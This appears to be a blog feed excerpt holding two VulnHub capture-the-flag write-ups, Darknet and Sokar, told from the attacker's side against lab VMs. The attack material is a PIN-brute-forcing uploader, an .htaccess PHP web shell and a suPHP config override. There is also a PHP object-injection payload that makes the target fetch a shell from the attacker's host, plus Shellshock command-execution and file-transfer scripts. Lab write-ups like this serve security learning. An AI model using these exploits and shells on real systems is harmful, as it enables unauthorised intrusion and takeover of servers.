                   &#39;Action&#39;: &#39;Upload&#39;,
               })

    if &#39;incorrecta&#39; not in r.text:
        print(&#39;\n[+] Found pin: {pin}&#39;.format(pin=&#39;, &#39;.join(map(str, c))))
        break

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seeing this script in action would look as follows:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/13eq1usld7zxx2yoj55khbhwp.js&#34; id=&#34;asciicast-13eq1usld7zxx2yoj55khbhwp&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;So the pin code was &lt;code&gt;37, 10, 59, 17&lt;/code&gt;. Easy.&lt;/p&gt;

&lt;p&gt;The next obvious step was to try and figure out how we can weaponize this file upload, if at all. The file upload appeared to accept most uploads except for those ending in .php. Uploading a PHP script would return the error &lt;em&gt;Formato invalido!&lt;/em&gt; Things like images (or almost anything that was not useful) responded with &lt;em&gt;Subida exitosa!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I managed to discover a &lt;code&gt;uploads/&lt;/code&gt; directory with &lt;code&gt;gobuster&lt;/code&gt; again that helped me locate the uploaded files that I was uploading. The filenames appeared to remain intact which made things a little easier. But, this did not help me. I really hoped for some code execution.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;fast forward even more hours&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Eventually, I came across some PHP file upload bypass techniques that involve &lt;code&gt;.htaccess&lt;/code&gt; files. The premise being that if its possible to write/overwrite a folders &lt;code&gt;.htaccess&lt;/code&gt;, then it may be possible to &lt;a href=&#34;http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html&#34;&gt;add a tiny backdoor shell&lt;/a&gt; to a folder. Sneaky! The only real requirement was that the VirtualHost configuration had to allow for &lt;code&gt;.htaccess&lt;/code&gt; files to be read. As I had already downloaded the configuration file for signal8.darknet.com, I could quickly see that &lt;code&gt;AllowOverride&lt;/code&gt; was set to &lt;code&gt;All&lt;/code&gt;. Fantastic!&lt;/p&gt;

&lt;p&gt;I picked a shell from the &lt;a href=&#34;https://github.com/wireghoul/htshells&#34;&gt;https://github.com/wireghoul/htshells&lt;/a&gt; repository &lt;a href=&#34;https://github.com/wireghoul/htshells/blob/master/shell/mod_php.shell.htaccess&#34;&gt;here&lt;/a&gt;. From my previous testing, I wrote a small uploader so that I wouldn&amp;rsquo;t have to click those checkboxes all the time.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import sys
import os.path as path

s = requests.Session()


def w(text):
    sys.stdout.write(&#39;\r&#39; + text)
    sys.stdout.flush()


print(&#39;[+] Logging in ...&#39;)
s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
    &#39;username&#39;: &#39;errorlevel&#39;,
    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
})

print(&#39;[+] Uploading : {file}&#39;.format(file=sys.argv[1]))
r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
           files={&#39;imag&#39;: open(sys.argv[1], &#39;rb&#39;)},
           data={
               &#39;checkbox[]&#39;: [37, 10, 59, 17],
               &#39;Action&#39;: &#39;Upload&#39;,
           })

if &#39;Subida exitosa&#39; in r.text:
    print(&#39;[+] Upload successful! Try: http://signal8.darknet&#39;
          &#39;.com/xpanel/uploads/{file}&#39;.format(file=path.basename(sys.argv[1])))
elif &#39;Formato invalido&#39; in r.text:
    print(&#39;[!] Upload failed. Invalid format.&#39;)
else:
    print(&#39;[!] Upload failed, unknown error.&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I had to do was runt his script, providing the filename that I want to upload and viola.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python bruteUploader.py .htaccess
[+] Logging in ...
[+] Uploading : .htaccess
[+] Upload successful! Try: http://signal8.darknet.com/xpanel/uploads/.htaccess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once uploaded, I browsed to the location and was met with what looks like some code execution again!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As expected, the OS command execution does not work due to all those &lt;code&gt;disable_functions&lt;/code&gt;, but we have PHP code execution so that was a start! I decided that for this one I wanted to try get a more fully featured shell working. So, I edited the &lt;code&gt;.htaccess&lt;/code&gt; to include a web shell that &lt;a href=&#34;https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e&#34;&gt;I was working quite some time ago&lt;/a&gt; (and finally kinda finished). I packed the shell and replaced the PHP in the &lt;code&gt;.htaccess&lt;/code&gt; with the more fully featured shells packed source.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# &amp;lt;!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
&amp;lt;Files ~ &amp;quot;^\.ht&amp;quot;&amp;gt;
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
&amp;lt;/Files&amp;gt;

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### --&amp;gt;&amp;lt;?php eval(base64_decode(&amp;quot;LONG BASE64 ENCODED STRING&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Uploaded this with my upload helper and boom, a better shell.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_shell2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;the-last-hurdle-s&#34;&gt;the last hurdle(s)&lt;/h2&gt;

&lt;p&gt;Wtf. The current user is &lt;code&gt;errorlevel&lt;/code&gt;&amp;hellip; I double checked and saw that previously we were the &lt;code&gt;devnull&lt;/code&gt; user. This had me pretty confused in the beginning and had me spend quite a bit of time to figure out how this is possible. From the &lt;code&gt;phpinfo()&lt;/code&gt; output we had no &lt;code&gt;open_basedir&lt;/code&gt; restriction so that allowed me to move around the filesystem much more freely than before. I also noticed that I am not able to access the home directory for the &lt;code&gt;errorlevel&lt;/code&gt; user so I couldn&amp;rsquo;t really figure out what was going on in there (the red color indicates read/write is not possible).&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_homedirs.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Eventually, I discovered the use of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; as a loaded module. This basically means that the PHP script will run as the owner of the file. So with that theory, its sane to assume that because &lt;code&gt;errorlevel&lt;/code&gt; owns the PHP files in the users home directory, that is why I am seen as that user too.&lt;/p&gt;

&lt;p&gt;Anyways, some more enumeration later, I discover some more PHP scripts in &lt;code&gt;/var/www&lt;/code&gt;. These were owned by &lt;code&gt;root&lt;/code&gt;, meaning that if there are any vulnerabilities, I could effectively become root!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_var_www.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Due to the fact that these were in &lt;code&gt;/var/www&lt;/code&gt;, I could just browse to the IP address of the VM and run these scripts. Calling the &lt;code&gt;sec.php&lt;/code&gt; script caused the server to return an HTTP 500 error.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_sec_error.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As I was able to read the files in &lt;code&gt;/var/www&lt;/code&gt;, I also downloaded &lt;code&gt;sec.php&lt;/code&gt; to get an idea of what its supposed to be doing.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

require &amp;quot;Classes/Test.php&amp;quot;;
require &amp;quot;Classes/Show.php&amp;quot;;

if(!empty($_POST[&#39;test&#39;])){
    $d=$_POST[&#39;test&#39;];
    $j=unserialize($d);
    echo $j;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The call to &lt;code&gt;unserialize()&lt;/code&gt; immediately hinted me towards what the next step would need to be. I continued to download the files that are required in the &lt;code&gt;Classes/&lt;/code&gt; folder.&lt;/p&gt;

&lt;p&gt;Test.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this-&amp;gt;url);
        $f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
        fwrite($f, $data);
        fclose($f);
        chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
}
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Show.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;        

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A textbook example of &lt;a href=&#34;https://www.owasp.org/index.php/PHP_Object_Injection&#34;&gt;PHP Object Injection&lt;/a&gt;! I continued to serialize an instance of of the &lt;code&gt;Show&lt;/code&gt; class by copying the class into a new PHP file, instantiating the &lt;code&gt;Show&lt;/code&gt; class and running the &lt;code&gt;serialize()&lt;/code&gt; function over it, printing the output.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;// Source code for poishow.php
&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

print_r(serialize(new Show()));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this with a PHP interpreter printed the serialized string.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poishow.php
O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now had something I could use to try and test the vulnerability. For the &lt;code&gt;Show&lt;/code&gt; class, we are going to leverage the &lt;code&gt;__toString()&lt;/code&gt; method defined when &lt;code&gt;sec.php&lt;/code&gt; calls &lt;code&gt;echo&lt;/code&gt; on the variable containing the unserialized object. I write &lt;em&gt;yet another python helper&lt;/em&gt; to send the serialized objects to the &lt;code&gt;sec.php&lt;/code&gt; as a POST parameter. This was mostly because I was too lazy to deal with my shell and escaping the quotes etc. :)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests

OBJECT = &amp;quot;&amp;quot;&amp;quot;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}&amp;quot;&amp;quot;&amp;quot;

print(&#39;[+] Exploiting the PHP Object Injection Bug&#39;)
r = requests.post(&#39;http://192.168.252.140/sec.php&#39;, data={&#39;test&#39;: OBJECT})
print r.status_code
print r.text
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this made the server still respond with an HTTP 500 error. Hmm. I was stuck here for quite some time trying to figure out if I can get some form of logging somewhere that I can read. At some stage, I came across &lt;code&gt;/etc/suphp&lt;/code&gt; and realized that the configuration file for it is writable.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_writable.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The &lt;code&gt;suphp.conf&lt;/code&gt; file had an entry &lt;code&gt;logfile=/var/log/suphp/suphp.log&lt;/code&gt; which I changed to log to &lt;code&gt;/tmp&lt;/code&gt;, hoping for it to reveal some information about the error code I was getting. To do this, I downloaded the file, modified the entry, and used my web shell&amp;rsquo;s upload functionality to override the original configuration file. This worked just fine, apart from the fact that that logfile too was not readable by me :(&lt;/p&gt;

&lt;p&gt;Some time later, I realized that there were two more configuration options in the configuration file that are of interest.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;; Minimum UID
min_uid=100

; Minimum GID
min_gid=100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remember that the PHP scripts we are trying to access are owned by &lt;code&gt;root&lt;/code&gt;? Turns out that this is a security feature of &lt;a href=&#34;http://www.suphp.org/&#34;&gt;suPHP&lt;/a&gt; to prevent scripts with too high permissions to run. So, I modify the configuration file again to replace the values with &lt;code&gt;0&lt;/code&gt; and upload it to override the original.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_suphp_override.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time, when I try and access the &lt;code&gt;sec.php&lt;/code&gt; script, I am provided with no output. Great! Back to the original Object Injection that I was trying to exploit, I rerun my python script to test the &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# python phpObjectInjection.py
[+] Exploiting the PHP Object Injection Bug
200
Showme
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;Showme&lt;/code&gt; output is expected as the &lt;code&gt;__toString()&lt;/code&gt; method is set to return this when the class should be represented as a string. Neat.&lt;/p&gt;

&lt;p&gt;The next step was then to serialize an object with my desired values for the &lt;code&gt;Test&lt;/code&gt; class&amp;rsquo;s properties. Following the logic of the &lt;code&gt;__destruct()&lt;/code&gt; method, it was clear to see that it would call a URL, write the contents to file and chmod the file accordingly. To do this, I added the &lt;code&gt;Test&lt;/code&gt; class and set the values in my original script.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        # Commented out as this will run when this script
        # also finishes :D

        #$data=file_get_contents($this-&amp;gt;url);
        #$f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
        #fwrite($f, $data);
        #fclose($f);
        #chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
}
}


$test = new Test();
$test-&amp;gt;url = &#39;http://192.168.252.1:8000/shell.txt&#39;;
$test-&amp;gt;name_file = &#39;pop.php&#39;;
$test-&amp;gt;path = &#39;/var/www&#39;;

print_r(serialize([$test, new Show()]));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this would then print out the serialized versions of the two classes in question.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php poi.php
a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only thing that is left to do is host the &lt;code&gt;shell.txt&lt;/code&gt; file at the location specified in the &lt;code&gt;$url&lt;/code&gt; property and run the little python helper with the new serialized string. I started up a HTTP server with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; and wrote my web shell to &lt;code&gt;shell.txt&lt;/code&gt;. The python helper was changed so that &lt;code&gt;OBJECT&lt;/code&gt; had the new serialized string.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;OBJECT = &amp;quot;&amp;quot;&amp;quot;a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:35:&amp;quot;http://192.168.252.1:8000/shell.txt&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:7:&amp;quot;pop.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;N;}}&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the helper and saw that the &lt;code&gt;shell.txt&lt;/code&gt; was downloaded from my web server. I could now browse to &lt;a href=&#34;http://192.168.252.140/pop.php&#34;&gt;http://192.168.252.140/pop.php&lt;/a&gt; :D&lt;/p&gt;

&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;

&lt;p&gt;Using the shell uploaded, I was finally able to cat the flag!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_flag.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;final-thoughts&#34;&gt;final thoughts&lt;/h2&gt;

&lt;p&gt;I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a &lt;code&gt;preg_match()&lt;/code&gt; was applied to filter out a few inputs.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&#39;id&#39;])){
    $id=$_GET[&#39;id&#39;];
    if(preg_match(&#39;/\*/&#39;, $id)){
        exit();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, the original SQL injection bug was also filtering out some input.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if(preg_match(&amp;quot;/select|and|[&amp;gt;,=&amp;lt;\-;]/&amp;quot;, $user)){
    echo &amp;quot;Ilegal&amp;quot;;
    exit();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the end, I learnt a lot! Thanks &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>beating sokar the vulnhub turns 0b10 challenge</title>
      <link>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</link>
      <pubDate>Sat, 21 Feb 2015 15:55:03 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html&#34;&gt;Vulnhub is 0b10&lt;/a&gt; years old. That is binary for 2 :) In order to celebrate this, &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt;
 created &lt;a href=&#34;https://www.vulnhub.com/entry/sokar-1,113/&#34;&gt;Sokar&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Sokar was used as another writeup competition (the first for 2015), similar to the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; challenge from Sep &amp;lsquo;14.
From the &lt;a href=&#34;http://blog.vulnhub.com/2015/01/competition-sokar.html&#34;&gt;competition announcement blogpost&lt;/a&gt;, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.&lt;/p&gt;

&lt;p&gt;Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!&lt;/p&gt;

&lt;p&gt;Here is my entry for the competition. Enjoy! :)&lt;/p&gt;

&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;

&lt;p&gt;You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire &lt;code&gt;nmap&lt;/code&gt; at it. I followed exactly these steps apart from using the usual &lt;code&gt;netdiscover&lt;/code&gt; to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.&lt;/p&gt;

&lt;p&gt;I knew which interface the network was bound to on my Mac, so I started the sniffer with &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@laptop » sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1

[... snip IPv6 talky talky ...]

IP src 0.0.0.0         dst 255.255.255.255 UDP src port 68 dst port 67
IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;192.168.217.163&lt;/strong&gt;. Great. This will be our target for a &lt;code&gt;nmap&lt;/code&gt; scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don&amp;rsquo;t rely on ICMP traffic ;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ nmap --reason 192.168.217.163 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST
Nmap scan report for 192.168.217.163
Host is up, received arp-response (0.00027s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT    STATE SERVICE  REASON
591/tcp open  http-alt syn-ack
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One port open on tcp. &lt;code&gt;tcp/591&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;cgi-bin-cat&#34;&gt;/cgi-bin/cat&lt;/h2&gt;

&lt;p&gt;The service on &lt;code&gt;tcp/591&lt;/code&gt; appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; to &lt;a href=&#34;http://192.168.217.163:591/cgi-bin/cat&#34;&gt;http://192.168.217.163:591/cgi-bin/cat&lt;/a&gt;. Requesting this page alone was the same stats, minus that creepy pink color ;)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/sokar_cat.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I toyed around quite a bit with this webserver. The textbook approach of running &lt;code&gt;wfuzz&lt;/code&gt; to discover some web paths, &lt;code&gt;nikto&lt;/code&gt; to discover some interesting information etc. was used. Alas, none of these tools proved really useful.&lt;/p&gt;

&lt;p&gt;Applying some more brain thingies to my current situation, I remembered the &lt;a href=&#34;http://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&#34;&gt;Shellshock&lt;/a&gt; bug disclosed in September 2014. The &lt;code&gt;/cgi-bin&lt;/code&gt; path was the biggest hint towards it. I also remembered &lt;a href=&#34;https://twitter.com/mubix&#34;&gt;@mubix&lt;/a&gt; was keeping a Github repository of &lt;a href=&#34;https://github.com/mubix/shellshocker-pocs&#34;&gt;PoC&amp;rsquo;s for shellshock&lt;/a&gt;, and promptly started to try a few against the CGI path.&lt;/p&gt;

&lt;p&gt;Eventually, &lt;a href=&#34;https://gist.github.com/mfadzilr/70892f43597e7863a8dc&#34;&gt;this&lt;/a&gt; PoC was modified a little to get me some working command injection via shellshock:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/usr/bin/id&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2015 21:23:07 GMT
Server: Apache/2.2.15 (CentOS)
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain; charset=UTF-8

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. I was now able to execute commands as &lt;code&gt;apache&lt;/code&gt;. This allowed me to enumerate a great deal of the machine with relative ease.&lt;/p&gt;

&lt;h2 id=&#34;making-life-easier&#34;&gt;making life easier&lt;/h2&gt;

&lt;p&gt;Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called &lt;code&gt;shock.py&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock Command Execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

# vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
command = sys.argv[1].strip()
print &amp;quot; * Executing %s\n&amp;quot; % command

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the above script, I could now just do &lt;code&gt;python shock.py &amp;quot;/usr/bin/id&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id&amp;quot;
 * Executing /usr/bin/id

uid=48(apache) gid=48(apache) groups=48(apache)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that &lt;code&gt;netcat&lt;/code&gt; was available and that &lt;code&gt;apache&lt;/code&gt; was allowed to execute it, however, all of my attempts failed. &lt;code&gt;SELinux&lt;/code&gt; was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!&lt;/p&gt;

&lt;p&gt;I was able to write to &lt;code&gt;/tmp&lt;/code&gt;, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially &lt;code&gt;echo &amp;lt;script source&amp;gt; &amp;gt;&amp;gt; /tmp/port_scan.py&lt;/code&gt;. Eventually I resorted to writing a helper called &lt;code&gt;transfer.py&lt;/code&gt; that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar Shellshock File Transfer
# 2015 Leon Jacobs

import requests
import sys
import os
import binascii

def do_command(command):

    headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % command }
    r = requests.options(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers)

    if not r.status_code == 200:
        raise Exception(&amp;quot; ! Command %s failed&amp;quot;)

if __name__ == &amp;quot;__main__&amp;quot;:

    if len(sys.argv) &amp;lt; 3:

        print &amp;quot; * Usage %s &amp;lt;source&amp;gt; &amp;lt;destination&amp;gt;&amp;quot; % sys.argv[0]
        sys.exit(1)

    # vuln@ curl -i -X OPTIONS -H &amp;quot;User-Agent: () { :;};echo;/bin/cat /etc/passwd&amp;quot; &amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;
    source = sys.argv[1].strip()
    destination = sys.argv[2].strip()
    print &amp;quot; * Starting transfer of local &#39;%s&#39; to remote &#39;%s&#39;&amp;quot; % (source, destination)

    hex_destination_file = &amp;quot;/tmp/&amp;quot; + binascii.b2a_hex(os.urandom(15)) + &amp;quot;.txt&amp;quot;
    print &amp;quot; * Temp file on remote will be: %s&amp;quot; % hex_destination_file

    # prepare a hex version of the local file
    with open(source) as f:
        source_file = f.read()

    # encode and split the source into chunks of 60
    source_file = source_file.encode(&#39;hex&#39;)
    source_data = {}
    source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)]

    print &amp;quot; * Transferring %d chunks to %s&amp;quot; % (len(source_data), hex_destination_file)
    iteration = 1
    for chunk in source_data:

        # check if it is start of file or append
        if iteration == 1:
            append = &amp;quot;&amp;gt;&amp;quot;
        else:
            append = &amp;quot;&amp;gt;&amp;gt;&amp;quot;

        # prepare the command and run it
        command = &amp;quot;echo &#39;%s&#39; %s %s&amp;quot; % (chunk, append, hex_destination_file)
        do_command(command)

        print &amp;quot; * Chunk %d/%d transferred&amp;quot; % (iteration, len(source_data))
        iteration += 1

    print &amp;quot; * Decoding hex on remote&amp;quot;
    command = &amp;quot;/usr/bin/xxd -r -p %s &amp;gt; %s&amp;quot; % (hex_destination_file, destination)
    do_command(command)

    print &amp;quot; * Cleaning up temp file %s&amp;quot; % hex_destination_file
    command = &amp;quot;/bin/rm -f %s&amp;quot; %  hex_destination_file
    do_command(command)

    print &amp;quot; * Local &#39;%s&#39; transferred to remote &#39;%s&#39;&amp;quot; % (source, destination)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;egress-firewalls-le-suck&#34;&gt;egress firewalls le-suck&lt;/h2&gt;

